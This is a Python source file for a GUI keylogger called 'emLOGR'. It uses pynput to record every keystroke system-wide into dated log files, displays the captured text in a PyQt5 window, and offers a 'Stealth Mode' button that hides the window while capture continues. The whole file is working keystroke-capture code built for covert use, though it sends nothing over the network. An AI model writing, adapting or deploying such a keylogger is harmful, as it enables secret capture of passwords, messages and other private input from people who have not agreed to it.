import sys
import os
import threading
import datetime
import webbrowser
from pynput import keyboard
from PyQt5.QtWidgets import (
    QApplication, QTextEdit, QVBoxLayout, QWidget,
    QLabel, QPushButton, QHBoxLayout
)
from PyQt5.QtCore import Qt, QTimer

# === LOG CONFIG ===
log_buffer = ""
last_key_time = datetime.datetime.now()
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

app = QApplication(sys.argv)
app_window = None

def get_log_path():
    date_str = datetime.datetime.now().strftime("%Y-%m-%d")
    return os.path.join(log_dir, f"keylog-{date_str}.txt")

def save_to_file(text):
    with open(get_log_path(), "a", encoding="utf-8") as f:
        f.write(text)

def format_key(key):
    try:
        return key.char
    except AttributeError:
        if key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "\t"
        else:
            return f"[{key.name.upper()}]"

def on_key_press(key):
    global log_buffer, last_key_time
    now = datetime.datetime.now()
    delta = (now - last_key_time).total_seconds()
    if delta > 3:
        timestamp = f"\n[{now.strftime('%H:%M:%S')}] "
        log_buffer += timestamp
        save_to_file(timestamp)

    k = format_key(key)
    log_buffer += k
    save_to_file(k)
    last_key_time = now

class KeyLoggerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("🕵️ emLOGR")
        self.setGeometry(200, 200, 650, 500)
        self.setStyleSheet("background-color: #121212; color: #00FF99; font-family: Consolas;")

        layout = QVBoxLayout()

        self.label = QLabel("emLOGR")
        self.label.setAlignment(Qt.AlignCenter)
        self.label.setStyleSheet("font-size: 18px; font-weight: bold;")
        layout.addWidget(self.label)

        self.text_area = QTextEdit()
        self.text_area.setReadOnly(True)
        layout.addWidget(self.text_area)

        button_row = QHBoxLayout()

        self.stealth_button = QPushButton("Stealth Mode")
        self.stealth_button.setStyleSheet("padding: 8px;")
        self.stealth_button.clicked.connect(self.hide)
        button_row.addWidget(self.stealth_button)

        self.open_log_button = QPushButton("Open Log File")
        self.open_log_button.setStyleSheet("padding: 8px;")
        self.open_log_button.clicked.connect(self.open_log_file)
        button_row.addWidget(self.open_log_button)

        layout.addLayout(button_row)

        self.path_label = QLabel(f"Saving to: {get_log_path()}")
        self.path_label.setStyleSheet("font-size: 10px; color: #888;")
        layout.addWidget(self.path_label)

        self.char_count_label = QLabel("Logged chars: 0")
        self.char_count_label.setStyleSheet("font-size: 12px; color: #bbb;")
        layout.addWidget(self.char_count_label)

        self.setLayout(layout)

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_display)
        self.timer.start(1000)

    def update_display(self):
        self.text_area.setPlainText(log_buffer[-5000:])
        self.char_count_label.setText(f"Logged chars: {len(log_buffer)}")

    def open_log_file(self):
        path = os.path.abspath(get_log_path())
        webbrowser.open(f"file://{path}")

# === MAIN ===
if __name__ == '__main__':
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

    app_window = KeyLoggerApp()
    app_window.show()  # Always launches open
    sys.exit(app.exec_())
